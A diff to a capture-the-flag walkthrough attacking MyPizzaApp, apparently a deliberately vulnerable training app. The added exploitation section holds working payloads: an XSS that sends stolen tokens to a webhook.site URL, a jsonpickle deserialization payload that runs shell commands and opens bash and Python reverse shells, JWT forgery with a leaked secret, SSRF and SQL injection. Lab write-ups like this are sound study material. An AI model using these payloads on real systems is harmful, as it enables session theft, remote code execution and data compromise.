@@ -2,8 +2,7 @@
 **Table des matières**
 - [MyPizzaApp CTF Walkthrough](#mypizzaapp-ctf-walkthrough)
   - [Consignes](#consignes)
-  - [Writing the Sysreptor Report](#writing-the-sysreptor-report)
-  - [Phase 1: SAST and manual analysis](#phase-1-sast-and-manual-analysis)
+  - [SAST and manual analysis](#sast-and-manual-analysis)
     - [Insecure Credentials](#insecure-credentials)
       - [Hardcoded Secrets](#hardcoded-secrets)
       - [Weak JWT Design and Role-in-Token Trust](#weak-jwt-design-and-role-in-token-trust)
@@ -28,6 +27,14 @@
       - [Missing 404 Route and Predictable Error Handling](#missing-404-route-and-predictable-error-handling)
       - [Exposed Source Maps, Debug Info and Server Metadata](#exposed-source-maps-debug-info-and-server-metadata)
     - [Supply Chain Vulnerabilities](#supply-chain-vulnerabilities)
+  - [Exploitation](#exploitation)
+    - [Setup](#setup)
+    - [Exploit chain](#exploit-chain)
+    - [JWT Forgery](#jwt-forgery)
+    - [SSFR](#ssfr)
+    - [SQLi](#sqli-1)
+    - [IDOR](#idor-1)
+    - [Auth guard failure](#auth-guard-failure)
   - [General Recommendations](#general-recommendations)
 
 
@@ -52,56 +59,12 @@ Ce rapport devra inclure :
 - Des axes de remédiations qui permettent de corriger les failles trouvées
 - Un scénario d'attaque complet démontrant comment un attaquant pourrait avancer étape par étape jusqu'à la compromission du serveur d'application
 
-
----
-
-## Writing the Sysreptor Report
-As you go, take screenshots of everything. A good Sysreptor report should be professional and structured:
-Executive Summary:
-- One paragraph for non-technical readers.
-- State that MyPizzaApp allows authentication bypass, stored XSS, token theft, privilege escalation, and server-side compromise.
-
-Scope and Methodology:
-- State that this was a white-box audit with source code review and live validation.
-- List the main tools used: browser DevTools, proxy, source inspection, and manual validation.
-- Mention which findings were confirmed in source and which were validated dynamically.
-
-Vulnerability Details for each issue:
-- Title: short, precise, and specific.
-- Affected component: file and route or page.
-- Description: explain the flaw and why it matters.
-- Proof of Concept: exact steps, payloads, and screenshots.
-- Impact: what an attacker gains in practice.
-- Remediation: concrete fix guidance, ideally with code or validation rules.
-- Detection notes: optional, but useful for repeatability.
-
-Attack Scenario:
-- Show the kill-chain from first foothold to final flag.
-- Keep it chronological.
-- Make each step depend on the previous one so the story is easy to follow.
-
-Evidence checklist:
-- Screenshot of the vulnerable request.
-- Screenshot of the browser or proxy response.
-- Screenshot of the admin or bot action where relevant.
-- Screenshot of the terminal or shell once RCE is achieved.
-- Screenshot of the final flag capture.
-
-Recommended report ordering:
-1. Authentication and session issues.
-2. Client-side authorization and route bypasses.
-3. Stored XSS and bot abuse.
-4. Server-side injection and deserialization.
-5. Post-exploitation and root access.
-
-&nbsp;  
-
 ---
 
 &nbsp;  
 
 
-## Phase 1: SAST and manual analysis
+## SAST and manual analysis
 ### Insecure Credentials
 #### Hardcoded Secrets
 - **Severity:** Critical
@@ -590,6 +553,278 @@ Recommended report ordering:
   - For `pip`, use `--only-binary :all:` to prevent building from source and ensure that only pre-built wheels are installed, or audit the dependencies for any that require building from source and review their setup scripts.
 
 
+
+## Exploitation
+### Setup
+- Tools needed: browser (DevTools), Burp or ZAP (HTTP proxy), curl, jq, jwt-cli or Python (PyJWT), dirb/gobuster (optional).
+- Start the app `./LaunchApp` (on your VM) and the proxy; ensure browser is configured to proxy traffic through Burp/ZAP.
+  - Go to `http://localhost:443/` instead of `https://localhost/`.
+  - Register `https://app1.tiweb.tp.ubik.academy/api` in your hosts file to point to `localhost` if you want to use the `ubik` hostname. In `C:\Windows\System32\drivers\etc\hosts`, add `127.0.0.1 app1.tiweb.tp.ubik.academy`
+  - For local Docker use, change the Angular production API URL to a relative URL: `apiUrl: '/api'`
+  - `docker compose exec -T backend alembic upgrade head` to run DB migrations if they fail on first launch. Or clean up with `docker compose down -v` and try again.
+- Register a normal user; capture `/register` request/response.
+- Login; capture `/token` or `/auth` request/response and note where `access_token` appears.
+- Inspect how `access_token` is stored (localStorage according to analysis) and whether refresh occurs.
+
+
+---
+
+&nbsp;  
+&nbsp;  
+### Exploit chain
+- Register new user
+- Add a comment with `<img src="x" onerror="window.location.href='https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?token=' + localStorage.getItem('access_token') + '&page=' + window.location.pathname + '&user=xss_poller';">`
+- Go to the webhook.site URL and wait for the token to be exfiltrated by the bot visiting the pizza page:![alt text](./exploitation/xss_poller_runs_exploit.png)
+  The token is only valid for 1 minute !!! (`expiresIn: '1m'`).
+- Use the stolen token to call the deserialization endpoint: 
+  ```bash
+  curl -k -X POST https://app1.tiweb.tp.ubik.academy/api/pizza/create -H "Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc4ODM5NzM2LCJleHAiOjE3Nzg4Mzk3OTZ9.DUCPF1i0c01DsPDpMNqZOAZ6LJ_AfAIV5gnQiDuVagA" -H "Content-Type: application/json" -d '{"name":"test","description":"test","price":10,"image_url":"http://example.com/image.jpg","ingredients":["test"],"allergens":["test"]}'
+  ```
+- Or directly in the XSS:
+  ```javascript
+  <script>
+    fetch('/pizza/create', {
+      method: 'POST',
+      headers: {
+        'Authorization': 'Bearer ' + localStorage.getItem('access_token'),
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        "py/reduce": [
+          {"py/type": "os.system"},
+          {"py/tuple": ["curl https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?pwned=$(whoami | base64)"]}
+        ]
+      })
+    });
+  </script>
+  ```
+  - Via the image onerror:
+    ```html
+    <img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/reduce':[{'py/type':'os.system'},{'py/tuple':['curl https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac?pwned=$(whoami | base64)']}]})});">
+    ```
+  ![Remote code execution](./exploitation/rce.png)
+
+- Reverse shell:
+ - On your machine run: `ncat -lvnp 9001`, `ip a` to get your IP, then base64 encode the reverse shell command and use it in the payload: `echo -n "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1'" | base64`
+ - On the target, the payload will decode and execute the reverse shell: `<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/reduce':[{'py/type':'os.system'},{'py/tuple':['echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85MDAxIDA+JjEn | base64 -d | bash']}]})});">`
+
+- Here, `ip a` gives `127.19.0.1` for the bridge with Docker.
+- We use this payload: `echo -n "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"172.27.248.70\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" | base64 -w 0` which equates to `cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=`  
+- Payload (we use os.system or subprocess.getoutput which is more stealthy, no process created, but might be detected by EDRs if they look for long-running commands or base64 decoding):  
+    `<img src="x" onerror="fetch('/api/pizza/create',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('access_token'),'Content-Type':'application/json'},body:JSON.stringify({'py/object':'awefull_pizza_shop.webserver.schemas.PizzaCreation','name':{'py/reduce':[{'py/type':'subprocess.getoutput'},{'py/tuple':['echo $RANDOM; echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yNy4yNDguNzAiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc= | base64 -d | bash &']}]},'description':'pwned','price':13.37,'image_url':'http://x','category':'MEAT'})});">`
+    ![we have a reverse shell access](./exploitation/reverse_shell.png)
+    ![we are root](./exploitation/root_reverse_shell.png)
+
+- Exploit the shell:
+  ![find / -perm -4000 -type f 2>/dev/null](./exploitation/suid_binaries.png)
+  ![ps aux](./exploitation/ps_aux.png)
+  ![whoami, id, hostname](./exploitation/whoami_id_hostname.png)
+  ![etc/passwd](./exploitation/etc_passwd.png)
+  ![env](./exploitation/env_vars.png)
+  ![find / -maxdepth 3 -type f -name "*flag*" 2>/dev/null](./exploitation/find_flags.png)
+  Flag: ![flag](./exploitation/flag_captured.png)
+
+- Edit the db:
+  ![install psql](./exploitation/psql_install.png)
+  ![connect to DB](./exploitation/psql_connect.png)
+  ![list users and change our permissions to admin](./exploitation/db_admin_perms.png)
+  After exiting the shell:
+  ![admin user](./exploitation/admin_user_verified.png)
+  ![remove admin perm to admin](./exploitation/remove_admin_perm.png)
+  ![pizza creation](./exploitation/pizza_creation.png)
+
+
+
+---
+
+
+&nbsp;  
+&nbsp;  
+### JWT Forgery
+We found a hardcoded secret in the Docker file that is used to create JWTs (`JWT_SECRET_KEY=SuperSecretKeyThatIsTottalyNotRandom`), therefore we can create our own admin token following the same structure as in xss-poller and using the real admin username `admin_user`:  
+```python
+import jwt
+import time
+
+secret = "SuperSecretKeyThatIsTottalyNotRandom"
+payload = {
+    "sub": "username:admin_user",
+    "role": "Admin",
+    "iat": int(time.time()),
+    "exp": int(time.time()) + 3600
+}
+
+forged_token = jwt.encode(payload, secret, algorithm="HS256")
+print(forged_token)
+```
+Which gives us `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTptYWlsIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc4ODYwNjkxLCJleHAiOjE3Nzg4NjQyOTF9.ivc8kYLIM9Vri_v72Vq_DvixTxWdQrDt8Bz_YXZ2dCk`.  
+Then we can set the `access_token` in localStorage to the forged token and access the admin UI:
+![admin access](./exploitation/admin_access.png)
+
+
+&nbsp;  
+### SSFR
+In the DevTools Console:  
+```javascript
+fetch('https://app1.tiweb.tp.ubik.academy/api/pizza/create', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc5MDE2MzEwLCJleHAiOjE3NzkwMTk5MTB9.MdqDE82rEFrjWHldvlxtESpnQvCymDL3dusLAeT9VaY',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    "py/object": "awefull_pizza_shop.webserver.schemas.PizzaCreation",
+    "name": "SSRF Test",
+    "description": "Testing SSRF",
+    "price": 10.0,
+    "image_url": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
+    "category": "MEAT"
+  })
+}).then(response => console.log("Status:", response.status));
+```
+
+**Note:** creating a pizza with an `image_url` that isn't an Url will cause a DoS on the server side since Pydantic validates each pizza before sending it to the front. If it doesn't start with http(s)://, it will throw an unhandled error.
+![SSFR Script](./exploitation/ssfr_script.png)
+![SSFR Pizza created](./exploitation/ssfr_pizza_created.png)
+![SSFR hooked](./exploitation/ssfr_hooked.png.png)
+
+&nbsp;  
+### SQLi
+```javascript
+fetch("https://app1.tiweb.tp.ubik.academy/api/pizza/category/MEAT'%20OR%201=1--", {
+  method: 'GET',
+  headers: {
+    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VybmFtZTphZG1pbl91c2VyIiwicm9sZSI6IkFkbWluIiwiaWF0IjoxNzc5MDE2MzEwLCJleHAiOjE3NzkwMTk5MTB9.MdqDE82rEFrjWHldvlxtESpnQvCymDL3dusLAeT9VaY'
+  }
+})
+.then(response => response.json())
+.then(data => console.log("SQLi Results Dump:", data));
+```
+Le résultat est un dump de toutes les pizzas, pas que de la catégorie MEAT, ce qui prouve que la requête SQL a été manipulée pour ignorer la condition de catégorie:  
+```js
+[
+  {
+    "name": "Margherita",
+    "description": "Classic pizza with tomato sauce and cheese",
+    "price": 9.99,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Margherita_Originale.JPG/280px-Margherita_Originale.JPG",
+    "id": "76b6e243-f64e-4bae-8d5f-057d920bd893"
+  },
+  {
+    "name": "Pepperoni",
+    "description": "Pepperoni pizza with spicy sausage",
+    "price": 12.49,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Pepperoni_Pizza_%2829204589095%29.jpg/220px-Pepperoni_Pizza_%2829204589095%29.jpg",
+    "id": "47b991d9-1987-4c15-8543-e3c74f7b8d9d"
+  },
+  {
+    "name": "Hawaiian",
+    "description": "Pizza with ham and pineapple",
+    "price": 11.99,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Pizza_Hawaii_02.jpg/643px-Pizza_Hawaii_02.jpg",
+    "id": "edef3bfc-a744-4bb1-a22a-f0acef20a7af"
+  },
+  {
+    "name": "Four Cheese",
+    "description": "A pizza with mozzarella, cheddar, parmesan, and gorgonzola",
+    "price": 13.5,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Pizza_quattro_formaggi_at_restaurant%2C_Chalk_Farm_Road%2C_London.jpg/280px-Pizza_quattro_formaggi_at_restaurant%2C_Chalk_Farm_Road%2C_London.jpg",
+    "id": "326a8d0a-2722-46e0-bbbf-d3584bee3924"
+  },
+  {
+    "name": "BBQ Chicken",
+    "description": "Barbecue chicken with onions and peppers",
+    "price": 14,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/B.B.Q._Chicken_Pizza_%2826679384893%29.jpg/800px-B.B.Q._Chicken_Pizza_%2826679384893%29.jpg?20181230000913",
+    "id": "49df020b-d451-4aac-8817-64c6f3356805"
+  },
+  {
+    "name": "Veggie Delight",
+    "description": "A healthy pizza with a variety of fresh vegetables",
+    "price": 10.5,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/Vegetarian_pizza.jpg/800px-Vegetarian_pizza.jpg",
+    "id": "f0a43328-08d4-45c0-8359-8990c2ae69b9"
+  },
+  {
+    "name": "Meat Feast",
+    "description": "A pizza loaded with bacon, sausage, ham, and pepperoni",
+    "price": 15.99,
+    "imageUrl": "https://www.pizzalarocca.co.uk/wp-content/uploads/2021/09/meat-feast-pizza.jpg",
+    "id": "3f90dce3-e775-4dda-9eac-f5b9a58d01bc"
+  },
+  {
+    "name": "Buffalo Chicken",
+    "description": "Buffalo chicken pizza with ranch dressing and mozzarella",
+    "price": 14.5,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/85/Buffalo_Chicken_Deep_Dish_Pizza.png/800px-Buffalo_Chicken_Deep_Dish_Pizza.png?20220120214314",
+    "id": "59eecba1-956a-4ae8-bc96-feeabfc1cc90"
+  },
+  {
+    "name": "Pesto Delight",
+    "description": "A pesto-based pizza with mozzarella, tomatoes, and basil",
+    "price": 12.99,
+    "imageUrl": "https://www.casa-di-francesco.fr/wp-content/uploads/pesto.jpg",
+    "id": "83c36f55-bc69-4998-9fc8-9b3435f1bdf0"
+  },
+  {
+    "name": "Greek Special",
+    "description": "Pizza with feta cheese, olives, spinach, and onions",
+    "price": 13.75,
+    "imageUrl": "https://pisapizza.ca/wp-content/uploads/2024/05/greek-pizza-21-001.jpg",
+    "id": "e652ab47-7f93-483d-b7fb-f77993243665"
+  },
+  {
+    "name": "Spicy Jalapeno",
+    "description": "Pizza with jalapenos, spicy sausage, and chili flakes",
+    "price": 11.49,
+    "imageUrl": "https://www.vindulge.com/wp-content/uploads/2023/02/Pizza-with-Jalapeno-Coppa-and-Hot-Honey.jpg",
+    "id": "e60cbb90-d86c-4250-99cc-9f1b9ba91a15"
+  },
+  {
+    "name": "Seafood Special",
+    "description": "A seafood pizza with shrimp, calamari, and mussels",
+    "price": 16.5,
+    "imageUrl": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/Seafood_pizza_%281%29.jpg/800px-Seafood_pizza_%281%29.jpg",
+    "id": "6619513c-67cc-48b0-9db0-c35184335358"
+  },
+  {
+    "name": "SSRF Test",
+    "description": "Testing SSRF",
+    "price": 10,
+    "imageUrl": "https://webhook.site/d99b0ff5-22d8-4132-a618-345d05aca3ac",
+    "id": "234b3a84-c76e-401d-8bb2-c493162edcb0"
+  }
+]
+```
+![Server response](./exploitation/sqli_server_response.png)
+![SQL dump](./exploitation/sqli_sql_dump.png)
+
+On remarque que le payload SSFR est bien présent.
+
+
+&nbsp;  
+### IDOR
+attempting to GET or PUT against another user's UUID at the `/api/users/<uuid>`.  
+the UUID were found with the RCE:  
+| id                                   | name       | role  |
+| ------------------------------------ | ---------- | ----- |
+| e3d5bf4b-3301-4f23-b012-fab4c2bd407c | admin_user | ADMIN |
+| 025a00bf-29dd-4f20-b0b3-dc7a5d0770bb | john_doe   | USER  |
+| 4a861f02-bb37-414f-909c-b18b286daef7 | jane_doe   | USER  |
+| e5bbae51-106c-4a2f-8816-03ba006c352b | mail       | ADMIN |
+
+
+=> Mitigated
+Description: Testing was conducted to identify Insecure Direct Object Reference (IDOR) vulnerabilities on the user profile endpoints. While the API utilizes UUIDs for user identification, the underlying source code dictates that the entire /users API router requires administrative privileges via the validate_user_admin dependency.
+Evidence: When attempting to send GET or POST requests to /api/users/<target_uuid> using a standard user's JWT token, the server correctly rejected the requests with a 401 Unauthorized response before processing the UUID. Therefore, standard users cannot enumerate or modify other users' profiles, effectively mitigating the IDOR risk on this endpoint. It requires an admin token to access any user profile, which is a secure design choice to prevent unauthorized access. it's not IDOR since the endpoint is protected by an auth guard that checks for admin role before even looking at the UUID, so there's no direct reference to an object that can be manipulated by the user without proper authorization.
+
+&nbsp;  
+### Auth guard failure
+![Auth guard failure](./exploitation/auth_guard_failure.png)
+with a fake but invalid token.
+
+
+---
 
 &nbsp;  
 &nbsp;  
